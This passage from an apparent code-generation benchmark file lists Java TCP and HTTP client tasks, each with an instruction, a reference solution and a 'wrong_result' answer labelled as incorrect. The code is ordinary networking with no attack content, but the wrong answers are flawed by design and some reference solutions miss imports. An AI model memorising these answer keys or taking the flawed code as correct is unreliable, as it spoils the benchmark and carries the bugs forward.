    "Canonical_solution": "import android.os.Handler;\nimport android.os.HandlerThread;\nimport android.util.Log;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.Arrays;\n\npublic class TcpClient {\n    private static final String TAG = TcpClient.class.getSimpleName();\n    private static final int PACKAGE_HEAD_LENGTH = 8;\n\n    public interface ReceiveListener {\n        void onReceive(int type, byte[] data);\n    }\n\n    private ReceiveListener receiveListener;\n    private String hostip = \"192.168.3.28\";\n    private int port = 2233;\n    private Socket socketClient;\n    private Handler handler;\n    private Thread receiveThread;\n\n    public TcpClient() {\n        HandlerThread tcpThread = new HandlerThread(\"tcpThread\");\n        tcpThread.start();\n        handler = new Handler(tcpThread.getLooper());\n        tryConnect();\n    }\n\n    private void tryConnect() {\n        handler.post(() -> {\n            while (true) {\n                if (connect()) {\n                    startReceive();\n                    break;\n                }\n            }\n        });\n    }\n\n    private boolean connect() {\n        closeAll();\n        try {\n            socketClient = new Socket();\n            SocketAddress socAddress = new InetSocketAddress(hostip, port);\n            socketClient.connect(socAddress, 5000);\n            Log.i(TAG, \"socket connected successfully\");\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n            return false;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n        return true;\n    }\n\n    public void send(byte[] data) {\n        Log.d(TAG, \"send data len:\" + data.length);\n        handler.post(() -> {\n            try {\n                OutputStream outputStream = socketClient.getOutputStream();\n                outputStream.write(data);\n            } catch (SocketException e) {\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public void onReceive(ReceiveListener receiveListener) {\n        this.receiveListener = receiveListener;\n    }\n\n    public void destroy() {\n        if (receiveThread != null) {\n            receiveThread.interrupt();\n        }\n        closeAll();\n    }\n\n    private void closeAll() {\n        if (socketClient == null || socketClient.isClosed() || !socketClient.isConnected()) {\n            return;\n        }\n        try {\n            socketClient.shutdownInput();\n            socketClient.shutdownOutput();\n            socketClient.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void startReceive() {\n        if (receiveThread != null) {\n            receiveThread.interrupt();\n        }\n        receiveThread = new Thread(new Receiver());\n        receiveThread.start();\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            while (true) {\n                if (receiveThread.isInterrupted()) {\n                    break;\n                }\n                try {\n                    InputStream inputStream = socketClient.getInputStream();\n                    boolean badPackage = false;\n                    int countHeadBytesLength = 0;\n                    byte[] headData = new byte[PACKAGE_HEAD_LENGTH];\n                    while (countHeadBytesLength < PACKAGE_HEAD_LENGTH) {\n                        int result = inputStream.read(headData, countHeadBytesLength, PACKAGE_HEAD_LENGTH - countHeadBytesLength);\n                        if (result == -1) {\n                            badPackage = true;\n                            break;\n                        }\n                        countHeadBytesLength += result;\n                    }\n                    if (badPackage) {\n                        Log.e(TAG, \"badPackage!\");\n                        continue;\n                    }\n                    int packageType = getTypeFromHeadByte(headData);\n                    int packageBodyBytesLength = getLengthFromHeadByte(headData);\n                    Log.d(TAG, \"new data received type:\" + packageType + \" body len:\" + packageBodyBytesLength);\n\n                    int countBodyBytesLength = 0;\n                    byte[] bodyData = new byte[packageBodyBytesLength];\n                    while (countBodyBytesLength < packageBodyBytesLength) {\n                        int result = inputStream.read(bodyData, countBodyBytesLength, packageBodyBytesLength - countBodyBytesLength);\n                        if (result == -1) {\n                            badPackage = true;\n                            break;\n                        }\n                        countBodyBytesLength += result;\n                    }\n                    if (badPackage) {\n                        Log.e(TAG, \"badPackage!\");\n                        continue;\n                    }\n                    if (receiveListener != null) {\n                        receiveListener.onReceive(packageType, bodyData);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    if (receiveThread.isInterrupted()) {\n                        break;\n                    }\n                    tryConnect();\n                    break;\n                }\n            }\n        }\n    }\n\n    private int getLengthFromHeadByte(byte[] b) throws IOException {\n        if (b.length != 8) {\n            throw new EOFException();\n        }\n        int ch1 = b[4] & 0x00FF;\n        int ch2 = b[5] & 0x00FF;\n        int ch3 = b[6] & 0x00FF;\n        int ch4 = b[7] & 0x00FF;\n        return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));\n    }\n\n    private int getTypeFromHeadByte(byte[] b) throws IOException {\n        if (b.length != 8) {\n            throw new EOFException();\n        }\n        int ch1 = b[0] & 0x00FF;\n        int ch2 = b[1] & 0x00FF;\n        int ch3 = b[2] & 0x00FF;\n        int ch4 = b[3] & 0x00FF;\n        return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class TcpClient {\n    private static final String TAG = \"TcpClient\";\n    private static final int PACKAGE_HEAD_LENGTH = 8;\n    private ReceiveListener receiveListener;\n    private String hostip;\n    private int port;\n    private Socket socketClient;\n    private Handler handler;\n    private Thread receiveThread;\n\n    public TcpClient(String hostip, int port) {\n        this.hostip = hostip;\n        this.port = port;\n        handler = new Handler(Looper.getMainLooper());\n        tryConnect();\n    }\n\n    private void tryConnect() {\n        while (true) {\n            try {\n                socketClient = new Socket();\n                socketClient.connect(new InetSocketAddress(hostip, port), 5000);\n                startReceive();\n                break;\n            } catch (Exception e) {\n                e.printStackTrace();\n                try {\n                    Thread.sleep(5000);\n                } catch (InterruptedException e1) {\n                    e1.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public boolean connect() {\n        try {\n            socketClient = new Socket(hostip, port);\n            startReceive();\n            return true;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public void send(final byte[] data) {\n        handler.post(new Runnable() {\n            @Override\n            public void run() {\n                try {\n                    if (socketClient != null && !socketClient.isClosed()) {\n                        OutputStream outputStream = socketClient.getOutputStream();\n                        outputStream.write(data);\n                        outputStream.flush();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    closeAll();\n                }\n            }\n        });\n    }\n\n    public void onReceive(ReceiveListener receiveListener) {\n        this.receiveListener = receiveListener;\n    }\n\n    public void destroy() {\n        closeAll();\n    }\n\n    private void closeAll() {\n        try {\n            if (socketClient != null) {\n                socketClient.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        if (receiveThread != null) {\n            receiveThread.interrupt();\n        }\n    }\n\n    private void startReceive() {\n        receiveThread = new Thread(new Receiver());\n        receiveThread.start();\n    }\n\n    private int getLengthFromHeadByte(byte[] b) {\n        return ((b[4] & 0xFF) << 24) | ((b[5] & 0xFF) << 16) | ((b[6] & 0xFF) << 8) | (b[7] & 0xFF);\n    }\n\n    private int getTypeFromHeadByte(byte[] b) {\n        return ((b[0] & 0xFF) << 24) | ((b[1] & 0xFF) << 16) | ((b[2] & 0xFF) << 8) | (b[3] & 0xFF);\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            try {\n                InputStream inputStream = socketClient.getInputStream();\n                byte[] buffer = new byte[1024];\n                while (!Thread.currentThread().isInterrupted() && socketClient.isConnected()) {\n                    int bytesRead = inputStream.read(buffer);\n                    if (bytesRead > 0) {\n                        byte[] header = new byte[PACKAGE_HEAD_LENGTH];\n                        System.arraycopy(buffer, 0, header, 0, PACKAGE_HEAD_LENGTH);\n                        int length = getLengthFromHeadByte(header);\n                        int type = getTypeFromHeadByte(header);\n                        byte[] body = new byte[length];\n                        System.arraycopy(buffer, PACKAGE_HEAD_LENGTH, body, 0, length);\n                        if (receiveListener != null) {\n                            receiveListener.onReceive(type, body);\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                closeAll();\n            }\n        }\n    }\n\n    public interface ReceiveListener {\n        void onReceive(int type, byte[] data);\n    }\n}"
  },
  {
    "Task_id": 568,
    "Instruction": "Task Description: Create a Java class that implements TCP client functionality for network communication, including connection management and data transmission.\n\nClass Description: The TelnetTransport class provides TCP client capabilities for establishing connections, sending/receiving data, and managing network resources. It handles multiple IP addresses for a given hostname and provides basic I/O operations.\n\nAttributes:\n- socket: Socket - The underlying TCP socket for network communication\n- is: InputStream - Input stream for receiving data from the server\n- os: OutputStream - Output stream for sending data to the server\n- connected: boolean - Connection status flag indicating whether the client is currently connected\n\nMethods:\n- connect(String hostname, int port) -> void - Establishes a connection to the specified host and port, trying all available IP addresses for the hostname. Throws IOException on connection failure.\n- close() -> void - Closes the connection and releases all network resources. Handles cleanup gracefully.\n- flush() -> void - Flushes the output stream to ensure all buffered data is sent. Throws IOException on failure.\n- isConnected() -> boolean - Returns the current connection status (true if connected).\n- read(byte[] buffer, int start, int len) -> int - Reads data from the input stream into the buffer. Returns number of bytes read or throws IOException if connection is closed.\n- write(byte[] buffer) -> void - Writes the entire buffer to the output stream. Throws IOException on failure.\n- write(int c) -> void - Writes a single byte to the output stream. Throws IOException on failure.\n- tryAllAddresses(Socket sock, String host, int port) -> void - Private helper method that attempts connection to all IP addresses associated with a hostname. Throws SocketTimeoutException if all attempts fail.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\nimport java.net.UnknownHostException;\n\npublic class TelnetTransport {\n    private Socket socket;\n    private InputStream is;\n    private OutputStream os;\n    private boolean connected = false;\n\n    public void connect(String hostname, int port) throws IOException {\n        socket = new Socket();\n        tryAllAddresses(socket, hostname, port);\n        connected = true;\n        is = socket.getInputStream();\n        os = socket.getOutputStream();\n    }\n\n    private void tryAllAddresses(Socket sock, String host, int port) throws IOException {\n        InetAddress[] addresses = InetAddress.getAllByName(host);\n        for (InetAddress addr : addresses) {\n            try {\n                sock.connect(new InetSocketAddress(addr, port));\n                return;\n            } catch (SocketTimeoutException ignored) {\n            }\n        }\n        throw new SocketTimeoutException(\"Could not connect; socket timed out\");\n    }\n\n    public void close() {\n        connected = false;\n        if (socket != null) {\n            try {\n                socket.close();\n                socket = null;\n            } catch (IOException e) {\n                System.err.println(\"Error closing socket: \" + e.getMessage());\n            }\n        }\n    }\n\n    public void flush() throws IOException {\n        if (os != null) {\n            os.flush();\n        }\n    }\n\n    public boolean isConnected() {\n        return connected;\n    }\n\n    public int read(byte[] buffer, int start, int len) throws IOException {\n        int n = is.read(buffer, start, len);\n        if (n < 0) {\n            throw new IOException(\"Remote end closed connection.\");\n        }\n        return n;\n    }\n\n    public void write(byte[] buffer) throws IOException {\n        if (os != null) {\n            os.write(buffer);\n        }\n    }\n\n    public void write(int c) throws IOException {\n        if (os != null) {\n            os.write(c);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TelnetTransport {\n    private Socket socket;\n    private InputStream is;\n    private OutputStream os;\n    private boolean connected;\n\n    public void connect(String hostname, int port) throws IOException {\n        if (connected) {\n            throw new IOException(\"Already connected\");\n        }\n        socket = new Socket();\n        try {\n            tryAllAddresses(socket, hostname, port);\n            is = socket.getInputStream();\n            os = socket.getOutputStream();\n            connected = true;\n        } catch (IOException e) {\n            socket.close();\n            throw e;\n        }\n    }\n\n    private void tryAllAddresses(Socket sock, String host, int port) throws IOException {\n        InetAddress[] addresses = InetAddress.getAllByName(host);\n        for (InetAddress address : addresses) {\n            try {\n                sock.connect(new InetSocketAddress(address, port), 5000);\n                return;\n            } catch (IOException e) {\n                continue;\n            }\n        }\n        throw new SocketTimeoutException(\"Failed to connect to any address\");\n    }\n\n    public void close() throws IOException {\n        if (connected) {\n            connected = false;\n            if (is != null) {\n                is.close();\n            }\n            if (os != null) {\n                os.close();\n            }\n            if (socket != null) {\n                socket.close();\n            }\n        }\n    }\n\n    public void flush() throws IOException {\n        if (!connected) {\n            throw new IOException(\"Not connected\");\n        }\n        os.flush();\n    }\n\n    public boolean isConnected() {\n        return connected;\n    }\n\n    public int read(byte[] buffer, int start, int len) throws IOException {\n        if (!connected) {\n            throw new IOException(\"Not connected\");\n        }\n        int bytesRead = is.read(buffer, start, len);\n        if (bytesRead == -1) {\n            throw new IOException(\"Connection closed\");\n        }\n        return bytesRead;\n    }\n\n    public void write(byte[] buffer) throws IOException {\n        if (!connected) {\n            throw new IOException(\"Not connected\");\n        }\n        os.write(buffer);\n    }\n\n    public void write(int c) throws IOException {\n        if (!connected) {\n            throw new IOException(\"Not connected\");\n        }\n        os.write(c);\n    }\n}\n```"
  },
  {
    "Task_id": 57,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously to fetch data from a given URL and process the response as a JSON object.\n\nClass Description: HttpRequestHandler is a utility class that contains nested classes and methods for performing asynchronous HTTP requests. It uses Android's AsyncTask to perform network operations in the background and processes the response data.\n\nAttributes: None (This is a utility class with static methods and nested classes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - A nested AsyncTask class that performs HTTP GET requests in the background. It takes a URL as input, establishes a connection, reads the response, and publishes the progress for JSON processing.\n\nMethod2: ConvertInputToStringNoChange(InputStream inputStream) -> String - A static helper method that converts an InputStream into a String by reading all lines from the input stream and concatenating them.\n\nMethod Details:\n\nMyAsyncTaskgetNews:\n- Input Parameters: String... params (varargs where params[0] should be the URL string)\n- Return Type: String (though it primarily works through side effects)\n- Description: \n  1. Creates a URL object from the input string\n  2. Opens an HttpURLConnection with a 7-second timeout\n  3. Reads the input stream and converts it to a string\n  4. Publishes the result for JSON processing in onProgressUpdate\n  5. Disconnects the connection when done\n\nConvertInputToStringNoChange:\n- Input Parameters: InputStream inputStream (the stream to read from)\n- Return Type: String (the concatenated content of the stream)\n- Description:\n  1. Creates a BufferedReader from the InputStream\n  2. Reads all lines and concatenates them into a single string\n  3. Closes the input stream\n  4. Returns the concatenated string",
    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n            } catch (Exception ex) {}\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\npublic class HttpRequestHandler {\n    public static class MyAsyncTaskgetNews extends android.os.AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            String url = params[0];\n            try {\n                java.net.URL urlObj = new java.net.URL(url);\n                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) urlObj.openConnection();\n                connection.setConnectTimeout(7000);\n                connection.setReadTimeout(7000);\n                connection.setRequestMethod(\"GET\");\n                connection.setDoInput(true);\n                connection.connect();\n\n                java.io.InputStream inputStream = connection.getInputStream();\n                String result = ConvertInputToStringNoChange(inputStream);\n                publishProgress(result);\n                connection.disconnect();\n                return result;\n            } catch (Exception e) {\n                e.printStackTrace();\n                return null;\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            super.onProgressUpdate(values);\n            // Process JSON here using values[0]\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(java.io.InputStream inputStream) {\n        java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter(\"\\\\A\");\n        String result = scanner.hasNext() ? scanner.next() : \"\";\n        scanner.close();\n        try {\n            inputStream.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return result;\n    }\n}\n```"
  },
  {
    "Task_id": 572,
    "Instruction": "Task Description: Create a function that establishes a TCP client connection to a server, sends data from an input stream, and verifies the successful transmission of data.\n\nFunction Description: The function should establish a connection to a server using a Socket, send data from an input stream to the server via an output stream, and ensure the data was transmitted successfully. It should also handle resource cleanup and verify the progress of the transmission.\n\nInput: \n- uri: [URI] - The URI object containing the host and port of the server to connect to.\n- inputStream: [InputStream] - The input stream containing the data to be sent to the server.\n- parser: [Object] - An object that manages the start and stop of the parsing process (assumed to have start() and stop() methods).\n\nOutput: \n- bytes: [long] - The number of bytes successfully transmitted to the server.\n- The function also asserts that the socket is connected, the number of bytes transmitted is greater than 0, and the progress of the transmission matches the expected progress. \n\nNote: The function may throw IOException, InterruptedException, or URISyntaxException.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.net.URISyntaxException;\n\npublic void testNormal() throws IOException, InterruptedException, URISyntaxException {\n    parser.start();\n\n    Socket client = new Socket(uri.getHost(), uri.getPort());\n    assertTrue(\"Socket is connected\", client.isConnected());\n\n    InputStream inputStream = combineResource(Progresses.allFiles);\n    OutputStream outputStream = client.getOutputStream();\n\n    long bytes = ByteStreams.copy(inputStream, outputStream);\n\n    Thread.sleep(100);\n\n    client.close();\n    parser.stop();\n\n    assertThat(bytes, greaterThan(0L));\n    assertThat(progesses, equalTo(Progresses.allProgresses));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\npublic static long sendTcpData(URI uri, InputStream inputStream, Object parser) throws IOException, InterruptedException, URISyntaxException {\n    Socket socket = new Socket();\n    socket.connect(new InetSocketAddress(uri.getHost(), uri.getPort()), 5000);\n    if (!socket.isConnected()) {\n        throw new IOException(\"Failed to connect to server\");\n    }\n    parser.start();\n    byte[] buffer = new byte[8192];\n    long totalBytes = 0;\n    int bytesRead;\n    try (OutputStream outputStream = socket.getOutputStream()) {\n        while ((bytesRead = inputStream.read(buffer)) != -1) {\n            outputStream.write(buffer, 0, bytesRead);\n            totalBytes += bytesRead;\n        }\n    } finally {\n        parser.stop();\n        socket.close();\n    }\n    if (totalBytes <= 0) {\n        throw new IOException(\"No bytes were transmitted\");\n    }\n    return totalBytes;\n}\n```"
  },
  {
    "Task_id": 573,
    "Instruction": "Task Description: Implement a TCP client class in Java that can establish a connection to a server, send and receive data, and properly close the connection.\n\nClass Description: The GaNetCat class provides functionality for TCP client-server communication. It encapsulates socket operations, including connection establishment, data transmission, and resource cleanup.\n\nAttributes:\n- socket: Socket - The underlying socket used for network communication\n- inputStream: InputStream - Stream for receiving data from the server\n- outputStream: OutputStream - Stream for sending data to the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port. Throws IOException if connection fails.\n- sendData(InputStream source) -> void - Reads data from the source InputStream and sends it to the server through the output stream. Throws IOException if transmission fails.\n- receiveData(OutputStream destination) -> void - Receives data from the server and writes it to the destination OutputStream. Stops when encountering EOF or 0x04 (EOT) character. Throws IOException if reception fails.\n- close() -> void - Closes all resources (input stream, output stream, and socket) quietly, suppressing any exceptions during closure.",
    "Canonical_solution": "import org.apache.commons.io.IOUtils;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\n\npublic class GaNetCat {\n\n    private Socket socket;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket();\n        socket.connect(new InetSocketAddress(host, port));\n        inputStream = socket.getInputStream();\n        outputStream = socket.getOutputStream();\n    }\n\n    public void sendData(InputStream source) throws IOException {\n        byte[] dataArray = new byte[1024];\n        int length;\n        do {\n            length = source.read(dataArray);\n            if (length <= 0) {\n                break;\n            }\n            outputStream.write(dataArray, 0, length);\n            outputStream.flush();\n        } while (length > 0);\n    }\n\n    public void receiveData(OutputStream destination) throws IOException {\n        byte[] dataArray = new byte[1024];\n        int length;\n        do {\n            length = inputStream.read(dataArray);\n            if (length == 1 && dataArray[0] == 0x04) {\n                destination.flush();\n                break;\n            }\n            if (length <= 0) {\n                break;\n            }\n            destination.write(dataArray, 0, length);\n        } while (length > 0);\n    }\n\n    public void close() {\n        IOUtils.closeQuietly(inputStream);\n        IOUtils.closeQuietly(outputStream);\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // ignore\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class GaNetCat {\n    private Socket socket;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket(host, port);\n        inputStream = socket.getInputStream();\n        outputStream = socket.getOutputStream();\n    }\n\n    public void sendData(InputStream source) throws IOException {\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = source.read(buffer)) != -1) {\n            outputStream.write(buffer, 0, bytesRead);\n        }\n        outputStream.flush();\n    }\n\n    public void receiveData(OutputStream destination) throws IOException {\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = inputStream.read(buffer)) != -1) {\n            for (int i = 0; i < bytesRead; i++) {\n                if (buffer[i] == 0x04) {\n                    return;\n                }\n            }\n            destination.write(buffer, 0, bytesRead);\n        }\n    }\n\n    public void close() {\n        try {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n        } catch (IOException e) {\n            // Suppress exception\n        }\n        try {\n            if (outputStream != null) {\n                outputStream.close();\n            }\n        } catch (IOException e) {\n            // Suppress exception\n        }\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // Suppress exception\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 574,
    "Instruction": "Task Description: Create a function that establishes a TCP client connection to a service discovered via Eureka, sends a request, and processes the response.\n\nFunction Description: The function uses Eureka client to discover a service instance, establishes a socket connection to the discovered service, sends a formatted request string, and reads the response. It handles connection errors and IO exceptions appropriately.\n\nInput: \n- eurekaClient: EurekaClient - The Eureka client instance used for service discovery\n- (implicit) vipAddress: String - The virtual IP address of the service to discover (\"sampleservice.mydomain.net\")\n\nOutput: \n- void - The function doesn't return a value but prints the server response or error messages to standard output/error\n- Side effect: Establishes a network connection and communicates with the discovered service\n\nNote: The function includes error handling for service discovery failures, connection issues, and IO operations. The request string is dynamically generated with a timestamp.",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.io.IOException;\n\npublic void sendRequestToServiceUsingEureka(EurekaClient eurekaClient) {\n    String vipAddress = \"sampleservice.mydomain.net\";\n\n    InstanceInfo nextServerInfo = null;\n    try {\n        nextServerInfo = eurekaClient.getNextServerFromEureka(vipAddress, false);\n    } catch (Exception e) {\n        System.err.println(\"Cannot get an instance of example service to talk to from eureka\");\n        System.exit(-1);\n    }\n\n    Socket s = new Socket();\n    int serverPort = nextServerInfo.getPort();\n    try {\n        s.connect(new InetSocketAddress(nextServerInfo.getHostName(), serverPort));\n    } catch (IOException e) {\n        System.err.println(\"Could not connect to the server :\"\n                + nextServerInfo.getHostName() + \" at port \" + serverPort);\n    } catch (Exception e) {\n        System.err.println(\"Could not connect to the server :\"\n                + nextServerInfo.getHostName() + \" at port \" + serverPort + \"due to Exception \" + e);\n    }\n    try {\n        String request = \"FOO \" + new Date();\n\n        PrintStream out = new PrintStream(s.getOutputStream());\n        out.println(request);\n\n        BufferedReader rd = new BufferedReader(new InputStreamReader(s.getInputStream()));\n        String str = rd.readLine();\n        if (str != null) {\n            System.out.println(\"Received response from server: \" + str);\n        }\n        rd.close();\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport com.netflix.appinfo.ApplicationInfoManager;\nimport com.netflix.appinfo.InstanceInfo;\nimport com.netflix.discovery.EurekaClient;\nimport com.netflix.discovery.shared.Application;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.Socket;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic class TcpClientHandler {\n    public static void sendRequestToDiscoveredService(EurekaClient eurekaClient) {\n        try {\n            Application application = eurekaClient.getApplication(\"sampleservice.mydomain.net\");\n            if (application == null || application.getInstances().isEmpty()) {\n                System.err.println(\"No instances found for service: sampleservice.mydomain.net\");\n                return;\n            }\n\n            InstanceInfo instanceInfo = application.getInstances().get(0);\n            String host = instanceInfo.getIPAddr();\n            int port = instanceInfo.getPort();\n\n            try (Socket socket = new Socket(host, port);\n                 PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n                 BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n\n                String timestamp = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\").format(new Date());\n                String request = \"REQUEST:\" + timestamp;\n\n                out.println(request);\n                String response = in.readLine();\n\n                if (response != null) {\n                    System.out.println(\"Server response: \" + response);\n                } else {\n                    System.err.println(\"No response received from the server.\");\n                }\n            } catch (IOException e) {\n                System.err.println(\"Connection or I/O error: \" + e.getMessage());\n            }\n        } catch (Exception e) {\n            System.err.println(\"Service discovery failed: \" + e.getMessage());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 575,
    "Instruction": "Task Description: Implement a Java class that establishes a TCP client connection to a server, sends a command, and retrieves the server's response using socket programming.\n\nClass Description: The FourLetterCommand class provides functionality to connect to a server, send a command string, and receive the server's response. It handles socket creation, connection, data transmission, and resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the server to connect to\n- port: int - The port number on which the server is listening\n\nMethods:\n- FourLetterCommand(String host, int port) -> None - Constructor that initializes the host and port attributes\n- request(String command) -> String - Establishes a connection to the server, sends the command, and returns the server's response\n- response(Socket client) -> String - Reads the server's response from the socket input stream and returns it as a string\n- cleanup(Closeable c) -> void - Closes the provided Closeable resource (socket or stream) and handles any IOExceptions silently",
    "Canonical_solution": "import java.io.*;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\n\npublic class FourLetterCommand {\n\n    private String host;\n    private int port;\n\n    public FourLetterCommand(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String request(String command) {\n        final Socket socket = new Socket();\n        try {\n            socket.connect(new InetSocketAddress(host, port));\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(command.getBytes());\n            outputStream.flush();\n            return response(socket);\n        } catch (IOException e) {\n            throw new IllegalStateException(e);\n        }\n    }\n\n    private String response(Socket client) {\n        try {\n            var reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\n            var builder = new StringBuilder(\"\");\n            String str;\n            while ((str = reader.readLine()) != null) {\n                builder.append(str).append(\"\\n\");\n            }\n            cleanup(client);\n            return builder.toString();\n        } catch (Exception e) {\n            throw new IllegalStateException(e);\n        }\n    }\n\n    private void cleanup(Closeable c) {\n        if (c != null) {\n            try {\n                c.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class FourLetterCommand {\n    private String host;\n    private int port;\n\n    public FourLetterCommand(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String request(String command) {\n        Socket client = null;\n        try {\n            client = new Socket(host, port);\n            PrintWriter out = new PrintWriter(client.getOutputStream(), true);\n            out.println(command);\n            return response(client);\n        } catch (IOException e) {\n            return \"Error: \" + e.getMessage();\n        } finally {\n            cleanup(client);\n        }\n    }\n\n    private String response(Socket client) {\n        StringBuilder response = new StringBuilder();\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()))) {\n            String line;\n            while ((line = in.readLine()) != null) {\n                response.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            return \"Error reading response: \" + e.getMessage();\n        }\n        return response.toString();\n    }\n\n    private void cleanup(Closeable c) {\n        if (c != null) {\n            try {\n                c.close();\n            } catch (IOException e) {\n                // Silently handle IOException\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 576,
